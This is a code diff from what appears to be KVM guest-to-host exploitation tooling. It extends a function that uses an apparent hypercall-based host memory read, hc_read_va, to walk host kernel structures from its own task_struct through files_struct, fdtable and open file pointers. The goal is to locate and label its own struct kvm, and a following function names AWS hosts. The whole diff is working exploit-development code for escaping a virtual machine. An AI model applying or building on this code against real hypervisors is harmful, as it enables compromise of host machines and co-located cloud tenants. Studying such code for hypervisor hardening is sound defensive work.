@@ -343,6 +343,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	printf("\n");
 
 	uintptr_t task_struct = hc_read_va(pid+0x20) - 0xa40; // pid's tasks[0], pointing to task_struct's pid_links[0]
+	hva_t own_task_struct = task_struct;
 	dump(task_struct);
 	for (int off = 0; off < 0x80; off += 8) {
 		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
@@ -725,6 +726,58 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 		cur_kvm = hc_read_va(cur_kvm + H_KVM_VM_LIST) - H_KVM_VM_LIST;
 	} while (cur_kvm != kvm);
 
+
+	printf("===================================================================\n");
+	printf("===================================================================\n");
+	printf("===================================================================\n");
+
+	printf(">>> Find struct kvm from our own task_struct (via open files):\n");
+
+	dump(own_task_struct);
+	for (int off = 0; off < 0x70; off += 8) {
+		printf("own_task_struct+H_TASK_COMM+%4x = %16lx %s\n", off, hc_read_va(own_task_struct+H_TASK_COMM+off),
+			off == 0x48 ? "<-- struct files_struct *files" : "");
+	}
+	// --> #define H_TASK_FILES (H_TASK_COMM+0x48)
+
+	hva_t files = hc_read_va(own_task_struct+H_TASK_FILES);
+	dump(files);
+	for (int off = 0; off < 0x40; off += 8) {
+		printf("files+%4x = %16lx %s\n", off, hc_read_va(files+off),
+			off == 0x20 ? "<-- struct fdtable __rcu *fdt" : "");
+	}
+	// --> #define H_FILES_FDT 0x20
+
+	hva_t fdt = hc_read_va(files + H_FILES_FDT);
+	dump(fdt);
+	for (int off = 0; off < 0x40; off += 8) {
+		printf("fdt+%4x = %16lx %s\n", off, hc_read_va(fdt+off),
+			off == 0x8 ? "<-- struct file __rcu **fd" : "");
+	}
+	// --> #define H_FDTABLE_FD 0x8
+
+	hva_t fd = hc_read_va(fdt + H_FDTABLE_FD);
+	dump(fd);
+	// for (int off = 0; off < 0x40*8; off += 8) {
+	// 	u64 data = hc_read_va(fd+off);
+	// 	printf("fd+%4x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
+	// }
+
+	hva_t fd0 = hc_read_va(fd + 0);
+	for (int off = 0; off < 0x40; off += 8) {
+		printf("fd0+%4x = %16lx %s\n", off, hc_read_va(fd0+off),
+			off == 0x20 ? "<-- void *private_data" : "");
+	}
+	// --> #define H_FILE_PRIV 0x20
+
+	for (int i = 0; i < 0x28; i++) {
+		hva_t file = hc_read_va(fd+i*8);
+		for (int off = 0x20; off < 0x28; off += 8) {
+			u64 data = hc_read_va(file+off);
+			printf("fd[%2x] = %16lx | fd[%2x]->private_data = %16lx %s\n", i, file, i, hc_read_va(file+H_FILE_PRIV),
+				hc_read_va(file+H_FILE_PRIV) == OWN_KVM ? "<-- struct kvm *OWN_KVM" : "");
+		}
+	}
 }
 
 void reverse_host_kernel_data_structures_aws(void)
